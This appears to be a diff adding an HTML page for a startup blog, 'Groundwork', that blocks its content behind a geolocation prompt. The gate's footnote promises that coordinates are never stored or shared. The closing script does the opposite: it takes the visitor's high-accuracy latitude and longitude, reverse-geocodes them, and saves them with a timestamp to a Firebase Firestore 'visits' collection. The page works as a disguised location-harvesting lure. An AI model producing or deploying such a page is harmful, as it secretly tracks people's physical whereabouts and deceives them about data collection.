@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Groundwork — The Founder's Blog</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400;1,700&family=IBM+Plex+Mono:wght@300;400;500&family=IBM+Plex+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --cream: #f7f3ec;
+      --ink: #1a1714;
+      --rust: #c44b2b;
+      --gold: #c9973a;
+      --muted: #7a7065;
+      --border: rgba(26,23,20,0.12);
+      --card-bg: #f0ebe1;
+    }
+
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: 'IBM Plex Sans', sans-serif;
+      background: var(--cream);
+      color: var(--ink);
+      min-height: 100vh;
+    }
+
+    /* ── NOISE TEXTURE OVERLAY ── */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+      pointer-events: none; z-index: 0;
+      opacity: 0.5;
+    }
+
+    /* ══════════════════════════════
+       GATE
+    ══════════════════════════════ */
+    #gate {
+      position: fixed; inset: 0; z-index: 200;
+      display: flex; align-items: center; justify-content: center;
+      background: var(--ink);
+      transition: opacity 0.7s ease, transform 0.7s ease;
+    }
+    #gate.hide { opacity: 0; transform: translateY(-8px); pointer-events: none; }
+
+    .gate-wrap {
+      max-width: 460px; width: 100%;
+      padding: 0 28px;
+      text-align: center;
+    }
+
+    .gate-eyebrow {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.65rem;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: var(--gold);
+      margin-bottom: 24px;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+    }
+    .gate-eyebrow::before, .gate-eyebrow::after {
+      content: ''; flex: 1; max-width: 60px;
+      height: 1px; background: rgba(201,151,58,0.4);
+    }
+
+    .gate-logo {
+      font-family: 'Playfair Display', serif;
+      font-size: 3rem;
+      font-weight: 900;
+      color: var(--cream);
+      letter-spacing: -0.02em;
+      line-height: 1;
+      margin-bottom: 8px;
+    }
+    .gate-logo em { color: var(--rust); font-style: italic; }
+
+    .gate-tagline {
+      font-family: 'Playfair Display', serif;
+      font-style: italic;
+      font-size: 1rem;
+      color: rgba(247,243,236,0.4);
+      margin-bottom: 40px;
+    }
+
+    .gate-divider {
+      width: 40px; height: 1px;
+      background: rgba(247,243,236,0.15);
+      margin: 0 auto 32px;
+    }
+
+    .gate-message {
+      font-size: 0.85rem;
+      color: rgba(247,243,236,0.55);
+      line-height: 1.8;
+      margin-bottom: 32px;
+      font-weight: 300;
+    }
+    .gate-message strong {
+      color: rgba(247,243,236,0.85);
+      font-weight: 500;
+    }
+
+    #allow-btn {
+      display: inline-flex; align-items: center; gap: 10px;
+      background: var(--rust);
+      color: var(--cream);
+      border: none; cursor: pointer;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.78rem;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      padding: 14px 36px;
+      transition: background 0.2s, transform 0.15s;
+    }
+    #allow-btn:hover { background: #a83c21; transform: translateY(-2px); }
+    #allow-btn:active { transform: translateY(0); }
+    #allow-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+    #gate-msg {
+      margin-top: 18px;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.7rem;
+      color: rgba(247,243,236,0.35);
+      letter-spacing: 0.06em;
+      min-height: 16px;
+    }
+    #gate-msg.err { color: #e07058; }
+
+    .gate-footnote {
+      margin-top: 48px;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.6rem;
+      letter-spacing: 0.08em;
+      color: rgba(247,243,236,0.2);
+    }
+
+    /* ══════════════════════════════
+       MAIN BLOG
+    ══════════════════════════════ */
+    #blog {
+      opacity: 0;
+      transform: translateY(16px);
+      transition: opacity 0.8s ease 0.3s, transform 0.8s ease 0.3s;
+      position: relative; z-index: 1;
+    }
+    #blog.show { opacity: 1; transform: none; }
+
+    /* ── HEADER ── */
+    header {
+      border-bottom: 1px solid var(--border);
+      padding: 0 clamp(20px, 5vw, 80px);
+    }
+    .header-top {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 18px 0;
+      border-bottom: 1px solid var(--border);
+    }
+    .header-date {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.68rem;
+      letter-spacing: 0.1em;
+      color: var(--muted);
+    }
+    .header-nav {
+      display: flex; gap: 28px;
+    }
+    .header-nav a {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.68rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--muted);
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+    .header-nav a:hover { color: var(--ink); }
+
+    .header-main {
+      text-align: center;
+      padding: 32px 0 28px;
+    }
+    .pub-title {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(2.8rem, 6vw, 5rem);
+      font-weight: 900;
+      letter-spacing: -0.025em;
+      line-height: 1;
+      margin-bottom: 8px;
+    }
+    .pub-title em { font-style: italic; color: var(--rust); }
+    .pub-sub {
+      font-family: 'Playfair Display', serif;
+      font-style: italic;
+      font-size: 0.95rem;
+      color: var(--muted);
+    }
+
+    .header-cats {
+      display: flex; align-items: center; justify-content: center;
+      gap: 0;
+      padding: 12px 0 0;
+    }
+    .header-cats a {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.65rem;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: var(--muted);
+      text-decoration: none;
+      padding: 8px 18px;
+      border-left: 1px solid var(--border);
+      transition: color 0.2s, background 0.2s;
+    }
+    .header-cats a:last-child { border-right: 1px solid var(--border); }
+    .header-cats a:hover { color: var(--ink); background: rgba(0,0,0,0.03); }
+
+    /* ── LOCATION RIBBON ── */
+    .loc-ribbon {
+      background: var(--ink);
+      color: var(--cream);
+      padding: 9px clamp(20px, 5vw, 80px);
+      display: flex; align-items: center; gap: 12px;
+    }
+    .loc-ribbon-label {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.62rem;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      color: var(--gold);
+    }
+    .loc-ribbon-value {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.7rem;
+      color: rgba(247,243,236,0.65);
+    }
+    .loc-dot {
+      width: 6px; height: 6px; border-radius: 50%;
+      background: var(--rust);
+      flex-shrink: 0;
+      animation: pulse-dot 2.5s ease-in-out infinite;
+    }
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; } 50% { opacity: 0.3; }
+    }
+
+    /* ── MAIN CONTENT ── */
+    main {
+      max-width: 1180px;
+      margin: 0 auto;
+      padding: clamp(32px, 5vw, 60px) clamp(20px, 5vw, 80px);
+    }
+
+    /* featured row */
+    .featured-row {
+      display: grid;
+      grid-template-columns: 1fr 360px;
+      gap: 40px;
+      padding-bottom: 48px;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 48px;
+    }
+
+    .feat-main {}
+    .feat-tag {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.62rem;
+      letter-spacing: 0.16em;
+      text-transform: uppercase;
+      color: var(--rust);
+      margin-bottom: 14px;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .feat-tag::after { content: ''; flex: 1; max-width: 40px; height: 1px; background: var(--rust); }
+
+    .feat-title {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(1.8rem, 3.5vw, 2.8rem);
+      font-weight: 700;
+      line-height: 1.12;
+      letter-spacing: -0.02em;
+      margin-bottom: 16px;
+    }
+    .feat-title em { font-style: italic; color: var(--muted); }
+
+    .feat-excerpt {
+      font-size: 0.92rem;
+      color: var(--muted);
+      line-height: 1.8;
+      margin-bottom: 24px;
+      font-weight: 300;
+      max-width: 520px;
+    }
+
+    .feat-meta {
+      display: flex; align-items: center; gap: 16px;
+    }
+    .avatar {
+      width: 36px; height: 36px; border-radius: 50%;
+      background: var(--gold);
+      display: flex; align-items: center; justify-content: center;
+      font-family: 'Playfair Display', serif;
+      font-weight: 700;
+      font-size: 0.85rem;
+      color: var(--ink);
+      flex-shrink: 0;
+    }
+    .meta-text { font-size: 0.78rem; color: var(--muted); }
+    .meta-author { font-weight: 500; color: var(--ink); font-size: 0.82rem; }
+
+    .read-btn {
+      display: inline-flex; align-items: center; gap: 8px;
+      margin-top: 28px;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.72rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--ink);
+      text-decoration: none;
+      border-bottom: 1.5px solid var(--ink);
+      padding-bottom: 2px;
+      transition: color 0.2s, border-color 0.2s;
+    }
+    .read-btn:hover { color: var(--rust); border-color: var(--rust); }
+    .read-btn svg { transition: transform 0.2s; }
+    .read-btn:hover svg { transform: translateX(4px); }
+
+    /* sidebar latest */
+    .feat-sidebar { border-left: 1px solid var(--border); padding-left: 40px; }
+    .sidebar-heading {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.62rem;
+      letter-spacing: 0.16em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 24px;
+    }
+    .sidebar-post {
+      padding: 18px 0;
+      border-bottom: 1px solid var(--border);
+    }
+    .sidebar-post:first-of-type { padding-top: 0; }
+    .sidebar-post:last-of-type { border-bottom: none; }
+    .sp-tag {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.58rem;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: var(--rust);
+      margin-bottom: 6px;
+    }
+    .sp-title {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.02rem;
+      font-weight: 700;
+      line-height: 1.25;
+      margin-bottom: 6px;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .sp-title:hover { color: var(--rust); }
+    .sp-meta {
+      font-size: 0.7rem;
+      color: var(--muted);
+      font-family: 'IBM Plex Mono', monospace;
+    }
+
+    /* cards grid */
+    .section-label {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.62rem;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 28px;
+      display: flex; align-items: center; gap: 16px;
+    }
+    .section-label::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+    .cards-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 28px;
+      margin-bottom: 60px;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      padding: 26px 24px 22px;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      position: relative;
+      overflow: hidden;
+    }
+    .card::before {
+      content: '';
+      position: absolute; top: 0; left: 0; right: 0;
+      height: 3px;
+      background: var(--rust);
+      transform: scaleX(0);
+      transform-origin: left;
+      transition: transform 0.3s ease;
+    }
+    .card:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
+    .card:hover::before { transform: scaleX(1); }
+
+    .card-tag {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.58rem;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      color: var(--gold);
+      margin-bottom: 10px;
+    }
+    .card-title {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.12rem;
+      font-weight: 700;
+      line-height: 1.3;
+      margin-bottom: 10px;
+    }
+    .card-excerpt {
+      font-size: 0.78rem;
+      color: var(--muted);
+      line-height: 1.7;
+      font-weight: 300;
+      margin-bottom: 18px;
+    }
+    .card-footer {
+      display: flex; align-items: center; justify-content: space-between;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.62rem;
+      color: var(--muted);
+      border-top: 1px solid var(--border);
+      padding-top: 14px;
+    }
+    .card-read { color: var(--rust); font-weight: 500; }
+
+    /* quote strip */
+    .quote-strip {
+      border-top: 2px solid var(--ink);
+      border-bottom: 2px solid var(--ink);
+      padding: 36px 0;
+      margin-bottom: 60px;
+      text-align: center;
+    }
+    blockquote {
+      font-family: 'Playfair Display', serif;
+      font-style: italic;
+      font-size: clamp(1.2rem, 2.5vw, 1.65rem);
+      line-height: 1.5;
+      color: var(--ink);
+      max-width: 680px;
+      margin: 0 auto 14px;
+    }
+    cite {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.68rem;
+      letter-spacing: 0.1em;
+      color: var(--muted);
+      text-transform: uppercase;
+      font-style: normal;
+    }
+
+    /* newsletter */
+    .newsletter {
+      background: var(--ink);
+      padding: 48px clamp(20px, 5vw, 64px);
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 32px; flex-wrap: wrap;
+      margin-bottom: 60px;
+    }
+    .nl-copy { max-width: 400px; }
+    .nl-label {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.62rem;
+      letter-spacing: 0.16em;
+      text-transform: uppercase;
+      color: var(--gold);
+      margin-bottom: 10px;
+    }
+    .nl-title {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: var(--cream);
+      line-height: 1.2;
+    }
+    .nl-title em { font-style: italic; color: var(--rust); }
+    .nl-form { display: flex; gap: 0; }
+    .nl-form input {
+      flex: 1; min-width: 200px;
+      background: rgba(247,243,236,0.08);
+      border: 1px solid rgba(247,243,236,0.15);
+      border-right: none;
+      color: var(--cream);
+      padding: 12px 16px;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.78rem;
+      outline: none;
+    }
+    .nl-form input::placeholder { color: rgba(247,243,236,0.3); }
+    .nl-form button {
+      background: var(--rust);
+      color: var(--cream);
+      border: none; cursor: pointer;
+      padding: 12px 22px;
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.72rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      transition: background 0.2s;
+      white-space: nowrap;
+    }
+    .nl-form button:hover { background: #a83c21; }
+
+    /* footer */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: clamp(24px, 4vw, 40px) clamp(20px, 5vw, 80px);
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 20px; flex-wrap: wrap;
+    }
+    .footer-brand {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.3rem;
+      font-weight: 900;
+      letter-spacing: -0.02em;
+    }
+    .footer-brand em { color: var(--rust); font-style: italic; }
+    .footer-note {
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 0.62rem;
+      color: var(--muted);
+      letter-spacing: 0.06em;
+    }
+
+    @media (max-width: 860px) {
+      .featured-row { grid-template-columns: 1fr; }
+      .feat-sidebar { border-left: none; border-top: 1px solid var(--border); padding-left: 0; padding-top: 32px; }
+      .cards-grid { grid-template-columns: 1fr 1fr; }
+      .header-cats { flex-wrap: wrap; }
+    }
+    @media (max-width: 560px) {
+      .cards-grid { grid-template-columns: 1fr; }
+      .header-nav { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ══════════════════ GATE ══════════════════ -->
+<div id="gate">
+  <div class="gate-wrap">
+    <div class="gate-eyebrow">Est. 2024 &mdash; For builders</div>
+    <div class="gate-logo">Ground<em>work</em></div>
+    <div class="gate-tagline">Dispatches from the startup trenches</div>
+    <div class="gate-divider"></div>
+    <p class="gate-message">
+      Before you read, we'd like to know <strong>where you're reading from.</strong><br/>
+      We use your location to surface stories most relevant to your startup ecosystem — funding rounds, hiring markets, and founder events near you.
+    </p>
+    <button id="allow-btn">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/>
+      </svg>
+      Allow Location &amp; Enter
+    </button>
+    <p id="gate-msg"></p>
+    <p class="gate-footnote">Your coordinates are never stored or shared &mdash; used only in-session.</p>
+  </div>
+</div>
+
+<!-- ══════════════════ BLOG ══════════════════ -->
+<div id="blog">
+
+  <header>
+    <div class="header-top">
+      <div class="header-date" id="today-date">— , —</div>
+      <nav class="header-nav">
+        <a href="#">Essays</a>
+        <a href="#">Interviews</a>
+        <a href="#">Funding</a>
+        <a href="#">Playbooks</a>
+        <a href="#">About</a>
+      </nav>
+    </div>
+    <div class="header-main">
+      <div class="pub-title">Ground<em>work</em></div>
+      <div class="pub-sub">Dispatches from the startup trenches</div>
+    </div>
+    <div class="header-cats">
+      <a href="#">Fundraising</a>
+      <a href="#">Product</a>
+      <a href="#">Growth</a>
+      <a href="#">Culture</a>
+      <a href="#">Exits</a>
+      <a href="#">Deep Tech</a>
+    </div>
+  </header>
+
+  <!-- location ribbon -->
+  <div class="loc-ribbon">
+    <div class="loc-dot"></div>
+    <span class="loc-ribbon-label">Reading from</span>
+    <span class="loc-ribbon-value" id="loc-text">Detecting your region…</span>
+  </div>
+
+  <main>
+
+    <!-- FEATURED -->
+    <div class="featured-row">
+      <div class="feat-main">
+        <div class="feat-tag">Cover Story</div>
+        <h1 class="feat-title">The quiet death of the<br/><em>18-month runway myth</em></h1>
+        <p class="feat-excerpt">
+          For a decade, conventional wisdom said raise enough to give yourself 18 months. But today's founders are rewriting that calculus — discovering that how you spend capital matters infinitely more than how long it lasts.
+        </p>
+        <div class="feat-meta">
+          <div class="avatar">JM</div>
+          <div>
+            <div class="meta-author">Jessica Morrow</div>
+            <div class="meta-text">Senior Editor · Apr 16, 2026 · 11 min read</div>
+          </div>
+        </div>
+        <a href="#" class="read-btn">
+          Read the essay
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+        </a>
+      </div>
+
+      <div class="feat-sidebar">
+        <div class="sidebar-heading">Latest dispatches</div>
+
+        <div class="sidebar-post">
+          <div class="sp-tag">Fundraising</div>
+          <div class="sp-title">Why your Series A deck is already obsolete</div>
+          <div class="sp-meta">Apr 15 · 7 min</div>
+        </div>
+        <div class="sidebar-post">
+          <div class="sp-tag">Culture</div>
+          <div class="sp-title">The 4-day week experiment that backfired — and what we learned</div>
+          <div class="sp-meta">Apr 14 · 9 min</div>
+        </div>
+        <div class="sidebar-post">
+          <div class="sp-tag">Growth</div>
+          <div class="sp-title">Retention is the new acquisition: a PLG playbook</div>
+          <div class="sp-meta">Apr 12 · 6 min</div>
+        </div>
+        <div class="sidebar-post">
+          <div class="sp-tag">Deep Tech</div>
+          <div class="sp-title">Hardware startups are back — and VCs are finally paying attention</div>
+          <div class="sp-meta">Apr 10 · 12 min</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- CARDS -->
+    <div class="section-label">From the archives</div>
+    <div class="cards-grid">
+
+      <div class="card">
+        <div class="card-tag">Product</div>
+        <div class="card-title">Shipping fast vs. shipping right: a false dichotomy</div>
+        <p class="card-excerpt">The most dangerous thing you can do is make this into a binary choice. The best teams have figured out how to do both — here's their secret.</p>
+        <div class="card-footer">
+          <span>Marcus Osei · 8 min</span>
+          <span class="card-read">Read →</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-tag">Exits</div>
+        <div class="card-title">I sold my startup for $40M. Here's what nobody tells you.</div>
+        <p class="card-excerpt">The wire hit on a Tuesday. By Wednesday I didn't know what to do with my hands. The post-exit identity crisis is real, and it's rarely discussed.</p>
+        <div class="card-footer">
+          <span>Priya Nair · 14 min</span>
+          <span class="card-read">Read →</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-tag">Fundraising</div>
+        <div class="card-title">The cold email that got us a meeting with Sequoia</div>
+        <p class="card-excerpt">It wasn't clever. It wasn't cute. It was ruthlessly specific and took 4 hours to write. We're sharing the exact template and the reasoning behind every line.</p>
+        <div class="card-footer">
+          <span>Leila Hadid · 5 min</span>
+          <span class="card-read">Read →</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-tag">Culture</div>
+        <div class="card-title">Hiring your first 10: the decisions that will define you</div>
+        <p class="card-excerpt">Every company becomes its first 10 employees. Not who they hired for — who they actually were. The stakes of early hiring are brutally underestimated.</p>
+        <div class="card-footer">
+          <span>Tom Adeyemi · 10 min</span>
+          <span class="card-read">Read →</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-tag">Growth</div>
+        <div class="card-title">Zero to $1M ARR without a single paid ad</div>
+        <p class="card-excerpt">We spent nothing on acquisition for our first 14 months. Not because we couldn't — but because we were forced to be creative. This is what we built instead.</p>
+        <div class="card-footer">
+          <span>Anika Roth · 9 min</span>
+          <span class="card-read">Read →</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-tag">Deep Tech</div>
+        <div class="card-title">Why most AI startups will be feature flags by 2027</div>
+        <p class="card-excerpt">The wrapper economy has a shelf life. Founders building on top of foundation models need to understand what moats actually look like in a world where capability is commoditized.</p>
+        <div class="card-footer">
+          <span>Daniel Yeung · 13 min</span>
+          <span class="card-read">Read →</span>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- QUOTE -->
+    <div class="quote-strip">
+      <blockquote>"The hardest part of building a company isn't the product. It's maintaining your conviction through the long silence between signals."</blockquote>
+      <cite>— Paul Graham, Y Combinator</cite>
+    </div>
+
+    <!-- NEWSLETTER -->
+    <div class="newsletter">
+      <div class="nl-copy">
+        <div class="nl-label">Weekly dispatch</div>
+        <div class="nl-title">Essays worth your <em>Sunday morning.</em></div>
+      </div>
+      <div class="nl-form">
+        <input type="email" placeholder="your@email.com"/>
+        <button type="button">Subscribe</button>
+      </div>
+    </div>
+
+  </main>
+
+  <footer>
+    <div class="footer-brand">Ground<em>work</em></div>
+    <div class="footer-note">© 2026 Groundwork Media &mdash; Written for founders, by founders.</div>
+  </footer>
+
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp }
+    from "https://www.gstatic.com/firebasejs/12.12.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDc_cxzGYPefoBLqpmj3jZ-lyy9JXHO88A",
+    authDomain: "groundwork-blog.firebaseapp.com",
+    projectId: "groundwork-blog",
+    storageBucket: "groundwork-blog.firebasestorage.app",
+    messagingSenderId: "1045141540579",
+    appId: "1:1045141540579:web:8a8af6c57e59680083bfd6"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db  = getFirestore(app);
+
+  const gate     = document.getElementById('gate');
+  const blog     = document.getElementById('blog');
+  const allowBtn = document.getElementById('allow-btn');
+  const gateMsg  = document.getElementById('gate-msg');
+  const locText  = document.getElementById('loc-text');
+  const dateEl   = document.getElementById('today-date');
+
+  // Set today's date in header
+  dateEl.textContent = new Date().toLocaleDateString('en-US', { weekday:'long', year:'numeric', month:'long', day:'numeric' });
+
+  async function reverseGeocode(lat, lon) {
+    try {
+      const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&addressdetails=1&zoom=14`);
+      const d = await r.json();
+      const a = d.address;
+      // Try most-precise → least-precise for the locality name
+      const locality =
+        a.suburb       ||
+        a.neighbourhood||
+        a.quarter      ||
+        a.hamlet       ||
+        a.village      ||
+        a.town         ||
+        a.municipality ||
+        a.city_district||
+        a.city         ||
+        a.county       ||
+        a.state_district||
+        a.state        || '';
+      const country = a.country || '';
+      return [locality, country].filter(Boolean).join(', ') || 'Your Region';
+    } catch {
+      return 'Your Region';
+    }
+  }
+
+  function openBlog(pos) {
+    const { latitude: lat, longitude: lon } = pos.coords;
+
+    reverseGeocode(lat, lon).then(async place => {
+      locText.textContent = place;
+      try {
+        await addDoc(collection(db, "visits"), {
+          place, lat, lon,
+          timestamp: serverTimestamp()
+        });
+        console.log("Visit saved to Firestore ✓");
+      } catch (e) {
+        console.error("Firestore write failed:", e);
+      }
+    });
+
+    gate.classList.add('hide');
+    setTimeout(() => {
+      gate.style.display = 'none';
+      blog.classList.add('show');
+    }, 750);
+  }
+
+  function onError(err) {
+    gateMsg.classList.add('err');
+    const msgs = {
+      1: '✕ Location access denied. Please enable it in your browser and try again.',
+      2: '✕ Could not determine your position. Try again.',
+      3: '✕ The request timed out. Please try again.',
+    };
+    gateMsg.textContent = msgs[err.code] || '✕ Something went wrong. Please try again.';
+    allowBtn.disabled = false;
+    allowBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg> Try Again`;
+  }
+
+  allowBtn.addEventListener('click', () => {
+    if (!navigator.geolocation) {
+      gateMsg.classList.add('err');
+      gateMsg.textContent = '✕ Geolocation is not supported by your browser.';
+      return;
+    }
+    allowBtn.disabled = true;
+    gateMsg.classList.remove('err');
+    gateMsg.textContent = 'Requesting location…';
+
+    navigator.geolocation.getCurrentPosition(openBlog, onError, {
+      enableHighAccuracy: true,
+      timeout: 12000,
+      maximumAge: 0
+    });
+  });
+</script>
+
+</body>
+</html>
